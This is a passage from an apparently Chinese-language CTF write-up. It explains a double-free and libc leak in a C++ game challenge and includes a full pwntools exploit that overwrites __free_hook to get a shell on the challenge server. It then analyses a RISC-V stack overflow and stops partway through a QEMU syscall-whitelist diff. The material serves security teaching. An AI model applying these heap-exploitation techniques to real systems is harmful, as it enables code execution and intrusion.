put_map_vector(a1a);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_FE98();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">leave_name</span><span class="params">(game *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  game *v4; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  __int64 name; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a1;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;leave your name?&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)get_input_filter(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;) == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_string(&amp;name);</span><br><span class="line">    <span class="built_in">std</span>::getline&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;name);</span><br><span class="line">    put_name_to_vector((game *)&amp;::a1, (__int64)&amp;name);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::~basic_string(&amp;name, &amp;name);</span><br><span class="line">  &#125;</span><br><span class="line">  clear_map_vector(v4);</span><br><span class="line">  operator <span class="title function_">delete</span><span class="params">((<span class="type">void</span> *)v4-&gt;message)</span>;</span><br><span class="line">  sub_C026(v4);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序存在两个漏洞，一个是算是<code>message</code>脏数据。首先在<code>init_game</code>函数中为<code>game-&gt;message</code>分配空间的时候并没有清空内存中的数据，而<code>message</code>的堆块大小为<code>0x510</code>，也就是说释放之后重新申请即可以泄漏得到<code>libc</code>基址。程序恰好存在<code>restart</code>的情况，因此我们可以据此泄漏得到<code>libc</code>基址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">send_level(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;n&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">send_level(<span class="string">&quot;l&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message:&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br></pre></td></tr></table></figure>

<p>另一个就是<code>map+0xe0</code>处保存指针的<code>double free</code>漏洞。该处的漏洞是在调试中发现的，在<code>update level</code>之后退出会出现一个<code>double free</code>的漏洞，堆块的大小是<code>0x60</code>。那么接下来就是<code>double free</code>如何利用的问题了。我们能够进行任意堆块分配的就是<code>message</code>了。但是程序中采用的是<code>cin</code>进行读取的，不能覆盖到<code>0x60</code>的堆块。但是我们看到在读取得到<code>message</code>之后会将其<code>put vector</code>。在该函数中会将按照我们输入的<code>message</code>的长度进行堆块申请</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( current_vector_c )</span><br><span class="line">  current_vector_c = <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_string(</span><br><span class="line">    current_vector_c,</span><br><span class="line">    name_c);</span><br></pre></td></tr></table></figure>

<p>这里就达到了我们任意申请堆块的目的。下面就是正常的<code>double free</code>的操作了。这里注意的是<code>put_name_vector</code>函数调用结束之后就是<code>name</code>的析构函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">put_name_to_vector((game *)&amp;::a1, (__int64)&amp;name);</span><br><span class="line">std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(</span><br><span class="line">(__int64)&amp;name,</span><br><span class="line">(__int64)&amp;name);</span><br></pre></td></tr></table></figure>

<p>在我们覆写完毕<code>free_hook</code>之后此处是第一次调用的位置，因此我们将<code>name</code>的起始八个字节改为<code>/bin/sh</code>，覆写的<code>fd</code>指针自然变为<code>free_hook-0x8</code>。</p>
<p>这里需要注意的是<code>name,map</code>是两个<code>vector</code>。这里我们<code>message</code>输入的时候恰好为第四个不需要扩展。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0xB56b)\nb *$rebase(0xB166)\nb *$rebase(0xa70d)\nb *$rebase(0xb06f)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;52.152.231.198&#x27;</span>, <span class="number">8082</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_order</span>(<span class="params">order</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input an order:\n&quot;</span>, order)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_level</span>(<span class="params">level</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input an level from 1-9:\n&quot;</span>, level)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your name:&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;n&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">send_level(<span class="string">&quot;l&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message:&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;n&quot;</span>)</span><br><span class="line">leave_name(<span class="string">b&quot;a&quot;</span>*<span class="number">0x70</span>) <span class="comment"># name vector 1, ex</span></span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">leave_name(p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]- <span class="number">0x8</span>).ljust(<span class="number">0x50</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># name vector 2, ex</span></span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">leave_name(<span class="string">b&quot;a&quot;</span>*<span class="number">0x50</span>) <span class="comment"># name vector 3, ex</span></span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *$rebase(0xB56b)\nb *$rebase(0xB166)\nb *$rebase(0xa70d)\nb *$rebase(0xb06f)&quot;</span>)</span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">leave_name((<span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])).ljust(<span class="number">0x50</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>分析了一下<code>double free</code>的原因，是因为在<code>update level</code>的时候，第一此<code>set_level</code>会首先将<code>map</code>放到<code>vector</code>中，而第二次的时候又会执行<code>put_map_vector</code>函数，此时<code>map vector</code>需要进行扩展，而在扩展的过程中似乎会调用<code>map</code>的析构函数，将<code>map+0xe0</code>处的堆块指针释放掉，而当我们<code>quit</code>的时候又回调用一次<code>clear map vector</code>，此时又会调用<code>map</code>的析构函数，再次释放堆块指针。</p>
<p>从官方的<code>wp</code>来看，当使用<code>vector::push_back()</code>函数的时候，它会调用拷贝函数，这是一个浅拷贝，如果将这个资源删除，并调用<code>vector:clear()</code>函数，那么就会调用两次资源的析构函数，这就回导致<code>double free</code>。但是这个程序中只调用了<code>vectro:clear()</code>函数。这里需要注意的是<code>vector</code>在容量不足的时候会发生扩展，扩展过程中仍然是进行一个浅拷贝，并调用<code>vector</code>中对象的析构函数，来删除原<code>vector</code>中的资源。这里满足了另一个资源释放，因此存在<code>double free</code>。</p>
<h2 id="Favourite-Architecure-flag1"><a href="#Favourite-Architecure-flag1" class="headerlink" title="Favourite Architecure flag1"></a>Favourite Architecure flag1</h2><p><code>riscv</code>栈溢出的漏洞，但是<code>ghidra</code>反编译失败，不知道咋回事。</p>
<p>比赛之后这里看了<a target="_blank" rel="noopener external nofollow noreferrer" href="https://matshao.com/2021/01/19/CTF2021-Favourite-Architecture-Challenges/">Mid Station</a>文章，找到了一个解决方法，首先我们看到<code>entry</code>函数，中首先设置了一个<code>gp</code>寄存器的值。这里的寄存器的值在整个过程中是不变的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FUN_000101ec</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此这里我们首先<code>ctrl-a</code>选中所有的反编译的代码，然后使用<code>crtl-r</code>设置寄存器的值，将<code>gp</code>的值设置为<code>0x6f178</code>，之后回到<code>main</code>函数，这里看到就可以反汇编了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined8 <span class="title function_">UndefinedFunction_000103e6</span><span class="params">(undefined8 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ulonglong uVar1;</span><br><span class="line">  longlong lVar2;</span><br><span class="line">  undefined auStack520 [<span class="number">192</span>];</span><br><span class="line">  undefined auStack328 [<span class="number">256</span>];</span><br><span class="line">  ulonglong uStack72;</span><br><span class="line">  longlong lStack64;</span><br><span class="line">  <span class="type">int</span> iStack52;</span><br><span class="line">  undefined8 uStack40;</span><br><span class="line">  undefined8 uStack24;</span><br><span class="line">  </span><br><span class="line">  uStack24 = param_1;</span><br><span class="line">  FUN_0001616e(param_1);</span><br><span class="line">  uStack40 = <span class="number">0x10400</span>;</span><br><span class="line">  FUN_000159bc(<span class="number">1</span>);</span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea28,<span class="number">0</span>);</span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea20,<span class="number">0</span>);</span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea18,<span class="number">0</span>);</span><br><span class="line">  FUN_0001605a(<span class="string">&quot;Input the flag: &quot;</span>);</span><br><span class="line">  read(auStack328);</span><br><span class="line">  uVar1 = <span class="built_in">strlen</span>(auStack328);</span><br><span class="line">  <span class="keyword">if</span> (uVar1 == ((longlong)(iRam000000000006e9dc + iRam000000000006e9d8) &amp; <span class="number">0xffffffff</span>U)) &#123;</span><br><span class="line">    lStack64 = FUN_00020386(auStack328 + ((longlong)iRam000000000006e9d8 &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    FUN_0001118a(auStack520,<span class="string">&quot;tzgkwukglbslrmfjsrwimtwyyrkejqzo&quot;</span>,<span class="string">&quot;oaeqjfhclrqk&quot;</span>,<span class="number">0x80</span>);</span><br><span class="line">    FUN_000111ea(auStack520,auStack328,iRam000000000006e9d8);</span><br><span class="line">    lVar2 = FUN_00020e2a(auStack328,&amp;DAT_0006d000,iRam000000000006e9d8);</span><br><span class="line">    <span class="keyword">if</span> (lVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      uStack72 = <span class="built_in">strlen</span>(lStack64);</span><br><span class="line">      iStack52 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (uStack72 &gt;&gt; <span class="number">3</span> &lt;= (ulonglong)(longlong)iStack52) &#123;</span><br><span class="line">          FUN_00016bc8(<span class="string">&quot;You are right :D&quot;</span>);</span><br><span class="line">          gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FUN_000102ae(iStack52 * <span class="number">8</span> + lStack64,&amp;DAT_0006d060);</span><br><span class="line">        lVar2 = FUN_00020e2a(iStack52 * <span class="number">8</span> + lStack64,(longlong)(iStack52 * <span class="number">8</span>) + <span class="number">0x6d030</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (lVar2 != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        iStack52 = iStack52 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  FUN_00016bc8(<span class="string">&quot;You are wrong ._.&quot;</span>);</span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞存在于输入<code>flag</code>的地方。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00010436</span> b7 e7 <span class="number">04</span> <span class="number">00</span>     lui        a5=&gt;DAT_0004e000,<span class="number">0x4e</span>               = FFh</span><br><span class="line"><span class="number">0001043</span>a <span class="number">13</span> <span class="number">85</span> <span class="number">07</span> <span class="number">89</span>     addi       a0=&gt;s_Input_the_flag:_0004d890,a5,<span class="number">-0x770</span> = <span class="string">&quot;Input the flag: &quot;</span></span><br><span class="line"><span class="number">0001043</span>e ef <span class="number">50</span> d0 <span class="number">41</span>     jal        ra,FUN_0001605a    <span class="comment">//output()</span></span><br><span class="line"><span class="number">00010442</span> <span class="number">93</span> <span class="number">07</span> <span class="number">84</span> ed     addi       a5,s0,<span class="number">-0x128</span>   <span class="comment">//&lt;&lt; input_falg str </span></span><br><span class="line"><span class="number">00010446</span> <span class="number">3</span>e <span class="number">85</span>           c.mv       a0,a5</span><br><span class="line"><span class="number">00010448</span> ef <span class="number">60</span> <span class="number">20</span> <span class="number">61</span>     jal        ra,read             <span class="comment">//read()</span></span><br><span class="line"><span class="number">0001044</span>c <span class="number">93</span> <span class="number">07</span> <span class="number">84</span> ed     addi       a5,s0,<span class="number">-0x128</span></span><br><span class="line"><span class="number">00010450</span> <span class="number">3</span>e <span class="number">85</span>           c.mv       a0,a5</span><br><span class="line"><span class="number">00010452</span> ef <span class="number">00</span> <span class="number">21</span> <span class="number">09</span>     jal        ra,<span class="built_in">strlen</span>           <span class="comment">//strlen()</span></span><br><span class="line"><span class="number">00010456</span> aa <span class="number">86</span>           c.mv       a3,a0</span><br><span class="line"><span class="number">00010458</span> <span class="number">03</span> a7 <span class="number">01</span> <span class="number">86</span>     lw         a4,<span class="number">-0x7a0</span>(gp)</span><br><span class="line"><span class="number">0001045</span>c <span class="number">83</span> a7 <span class="number">41</span> <span class="number">86</span>     lw         a5,<span class="number">-0x79c</span>(gp)</span><br><span class="line"><span class="number">00010460</span> b9 <span class="number">9f</span>           c.addw     a5,a4</span><br><span class="line"><span class="number">00010462</span> <span class="number">81</span> <span class="number">27</span>           c.addiw    a5,<span class="number">0x0</span></span><br><span class="line"><span class="number">00010464</span> <span class="number">82</span> <span class="number">17</span>           c.slli     a5,<span class="number">0x20</span></span><br><span class="line"><span class="number">00010466</span> <span class="number">81</span> <span class="number">93</span>           c.srli     a5,<span class="number">0x20</span></span><br><span class="line"><span class="number">00010468</span> <span class="number">63</span> <span class="number">94</span> f6 <span class="number">10</span>     bne        a3,a5,LAB_00010570  <span class="comment">//不等于0x59就跳转</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">LAB_00010570                                    XREF[<span class="number">1</span>]:     <span class="number">00010468</span>(j)  </span><br><span class="line"><span class="number">00010570</span> <span class="number">01</span> <span class="number">00</span>           c.nop</span><br><span class="line"><span class="number">00010572</span> <span class="number">21</span> a0           c.j        LAB_0001057a</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">LAB_0001057a                                    XREF[<span class="number">2</span>]:     <span class="number">00010572</span>(j), <span class="number">00010576</span>(j)  </span><br><span class="line"><span class="number">0001057</span>a b7 e7 <span class="number">04</span> <span class="number">00</span>     lui        a5=&gt;DAT_0004e000,<span class="number">0x4e</span>                            = FFh</span><br><span class="line"><span class="number">0001057</span>e <span class="number">13</span> <span class="number">85</span> <span class="number">87</span> <span class="number">8f</span>     addi       a0=&gt;s_You_are_wrong_._._0004d8f8,a5,<span class="number">-0x70</span>= <span class="string">&quot;You are wrong ._.&quot;</span></span><br><span class="line"><span class="number">00010582</span> ef <span class="number">60</span> <span class="number">60</span> <span class="number">64</span>     jal        ra,FUN_00016bc8              <span class="comment">//output()</span></span><br><span class="line"><span class="number">00010586</span> <span class="number">85</span> <span class="number">47</span>           c.li       a5,<span class="number">0x1</span></span><br><span class="line">LAB_00010588                                    XREF[<span class="number">1</span>]:     <span class="number">0001056</span>e(j)  </span><br><span class="line"><span class="number">00010588</span> <span class="number">3</span>e <span class="number">85</span>           c.mv       a0,a5</span><br><span class="line"><span class="number">0001058</span>a fe <span class="number">70</span>           c.ldsp     ra,<span class="number">0x1f8</span>(sp)</span><br><span class="line"><span class="number">0001058</span>c <span class="number">5</span>e <span class="number">74</span>           c.ldsp     s0,<span class="number">0x1f0</span>(sp)</span><br><span class="line"><span class="number">0001058</span>e <span class="number">13</span> <span class="number">01</span> <span class="number">01</span> <span class="number">20</span>     addi       sp,sp,<span class="number">0x200</span></span><br><span class="line"><span class="number">00010592</span> <span class="number">82</span> <span class="number">80</span>           ret</span><br></pre></td></tr></table></figure>

<p>从第一层的逻辑看来，首先是<code>read</code>了一个很长的字符串（注意到这里的函数不一定是<code>read</code>功能类似）。但是分配的长度才是<code>0x128</code>字节大小，因此这里可以溢出。并且如果我们输入的长度不为<code>0x59</code>那么直接会跳转到错误输出的位置之后结束进程，在结束进程的时候读取了<code>sp+0x1f8</code>的位置的值作为返回地址，因此我们可以直接溢出到返回地址。那么接下来就是如何利用的问题。</p>
<p>注意到题目给出的<code>patch</code>文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/linux-user/syscall.c b/linux-user/syscall.c</span><br><span class="line">index <span class="number">27</span>adee9.<span class="number">.2</span>d75464 <span class="number">100644</span></span><br><span class="line">--- a/linux-user/syscall.c</span><br><span class="line">+++ b/linux-user/syscall.c</span><br><span class="line">@@ <span class="number">-13101</span>,<span class="number">8</span> +<span class="number">13101</span>,<span class="number">31</span> @@ abi_long <span class="title function_">do_syscall</span><span class="params">(<span class="type">void</span> *cpu_env, <span class="type">int</span> num, abi_long arg1,</span></span><br><span class="line"><span class="params">         print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);</span></span><br><span class="line"><span class="params">     &#125;</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">-    ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span></span><br><span class="line"><span class="params">-                      arg5, arg6, arg7, arg8);</span></span><br><span class="line"><span class="params">+    <span class="keyword">switch</span> (num) &#123;</span></span><br><span class="line"><span class="params">+        <span class="comment">// syscall whitelist</span></span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_brk:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_uname:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_readlinkat:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_faccessat:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_openat2:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_openat:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_read:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_readv:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_write:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_writev:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_mmap:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_munmap:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_exit:</span></span><br><span class="line"><span class="params">+        <span 